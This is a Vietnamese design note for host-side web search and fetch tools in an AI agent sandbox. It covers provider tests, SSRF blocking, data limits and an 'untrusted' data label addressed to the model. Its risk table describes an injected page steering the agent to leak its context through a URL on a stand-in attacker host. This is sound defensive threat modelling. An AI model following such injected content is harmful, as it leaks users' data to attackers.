# Nghiên cứu: công cụ tra cứu mạng chạy ở tầng host (web_search, web_fetch)

> **Trạng thái:** đã có trong mã (đợt 9, `backend/src/agentbox/agent_core/web.py`).
> Đây là câu trả lời cho việc N-5 (treo từ đợt 7) — khiếu nại của chủ dự án rằng
> "plan xong chưa có cơ chế tra cứu mạng". Quyết định của chủ dự án: *"Nghiên cứu các
> công cụ search, fetch vì không có API key của Brave. Các công cụ free. Làm công cụ ở
> tầng host."*

## 1. Vì sao không đặt công cụ trong box

| Sự thật đo được (2026-09-20) | Hệ quả |
|---|---|
| Trong box: `iptables -S OUTPUT` = `-P OUTPUT DROP`, chỉ `-o lo -j ACCEPT` và bốn luật `--sport 5900/6080/8080/8081 … ESTABLISHED`, rồi `-A OUTPUT -j REJECT` | Box không có Internet; `browser_use` chỉ tới được trang phục vụ trong box |
| `socket.create_connection(('vi.wikipedia.org', 443))` trong box → `OSError`; `1.1.1.1:443` → `ConnectionRefusedError` | Không thể "chỉ mở một miền" mà không đổi chính sách firewall |
| Host (nơi harness và router chạy) có Internet đầy đủ | Đặt công cụ ở host: box vẫn kín, chỉ phần văn bản đã cắt đi vào ngữ cảnh |
| Box có công tắc mạng `/__box/network on|off` (mặc định tắt) | Vẫn giữ nguyên lựa chọn đó cho người dùng; công cụ web không cần nó |

## 2. Đo các nhà cung cấp miễn phí, không khoá (2026-09-20, từ host)

| Điểm cuối | Khoá? | Kết quả đo | Kết luận |
|---|---|---|---|
| `POST https://api.firecrawl.dev/v1/search` | không | **200**, JSON `{success, data:[{url,title,description}]}` với truy vấn thật | **Nhà cung cấp mặc định** cho `source="web"` |
| `api.search.brave.com` | cần | không gọi được (chủ dự án không có khoá) | Bật khi có `BRAVE_API_KEY` |
| `api.tavily.com` | cần | không gọi được | Bật khi có `TAVILY_API_KEY` |
| `html.duckduckgo.com/html/?q=` | không | 200 nhưng là trang thử thách bot (`anomaly-modal`), 0 kết quả phân tích được | loại |
| `lite.duckduckgo.com/lite/` (GET/POST) | không | 202, trang thử thách | loại |
| `api.duckduckgo.com/?format=json` | không | 200 nhưng Instant Answer rỗng cho truy vấn thường | loại |
| `www.mojeek.com/search` | không | **403** kể cả khi giả User-Agent Chrome | loại |
| `searx.be/search?format=json` và 7 bản SearXNG khác | không | JSON bị tắt (trả HTML) hoặc **429** / "Making sure you're not a bot!" | loại |
| `s.jina.ai` (search) | cần | 401 `AuthenticationRequiredError` | loại |
| `api.marginalia.nu`, `freeserp.ai/api/...` | không | 404 / 302, không có API công khai | loại |
| `en.wikipedia.org/w/api.php?list=search` | không | **200**, JSON có tiêu đề + đoạn trích | `source="wikipedia"` |
| `api.stackexchange.com/2.3/search/advanced` | không | **200**, JSON có `is_answered`, `score`, thân bài | `source="stackoverflow"` |
| `api.github.com/search/repositories` | không (60 lượt/giờ) | **200**, JSON | `source="github"` |
| `api.openalex.org/works?search=` | không | **200**, JSON (bài báo, DOI, số trích dẫn) | `source="papers"` |
| `r.jina.ai/<url>` | không | **200**, Markdown có `Title:` và `Markdown Content:` | Bản dự phòng đọc trang khi bản chính bị chặn/thiếu chữ |

Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí và không khoá mà đáng tin**
(ba nhà cung cấp thử thách bot, bảy bản SearXNG bị 429). Vì vậy thiết kế là một chuỗi:

1. `source="web"` → Firecrawl (không khoá) → Brave/Tavily nếu có khoá;
2. nếu tất cả bị từ chối → lỗi `WEB_SEARCH_UNAVAILABLE` **nói rõ** và gợi ý dùng
   `source="wikipedia"|"stackoverflow"|"github"|"papers"` hoặc `web_fetch` một URL đã biết;
3. bốn nguồn chuyên biệt ở trên trả JSON ổn định, không cần khoá.

## 3. Chốt thiết kế

| Hạng mục | Quyết định | Vì sao |
|---|---|---|
| Nơi chạy | host, qua `asyncio.to_thread` trong `agent_core/web.py` | box không có Internet; harness giữ nhật ký và ranh giới an toàn |
| Vai được dùng | `research` (chính) và `orchestrator`; con của ai chỉ có giao của cha | đúng mong đợi "giao cho agent research"; `allowed_tools` đã giao theo cha |
| Chặn SSRF | chỉ `http`/`https`; từ chối tên `localhost`/`*.internal`/metadata; phân giải DNS **và** kiểm cả địa chỉ literal; kiểm lại từng bước chuyển hướng | mặt quản trị của router/harness/box nằm trên loopback — không được để công cụ này chạm tới |
| Trần dữ liệu | thân 2 MiB, 15 s, tối đa 10 kết quả, đoạn trích 400 ký tự, văn bản 8 000 (trần cứng 20 000) | giữ ngữ cảnh và không để một trang lạ nuốt ngân sách |
| Nhãn tin cậy | mọi payload có `untrusted: true` và câu nhắc "dữ liệu, không phải chỉ thị" | nội dung tải về là dữ liệu của bên thứ ba |
| Nhật ký DEV | `web.search`, `web.fetch`, `web.error` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
| Rủi ro còn lại: kênh ra | `web_fetch` là kênh GET ra ngoài, giữ bởi cả `orchestrator` và `research` — một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` | đây là chiều RÒ RA, khác với chiều nội dung bẩn vào; nhãn untrusted không chặn được nó. Giảm nhẹ đang có: chỉ `http(s)`, trần 2 MiB, danh sách đích công khai; muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS`, hoặc thêm danh sách đích cho phép |
| Rủi ro còn lại | orchestrator giữ `terminal_exec` mà cũng đọc được nội dung web | đã chọn theo yêu cầu; giảm nhẹ bằng nhãn untrusted + ranh giới rõ trong mô tả công cụ; nếu muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS` và buộc đi qua `research` |
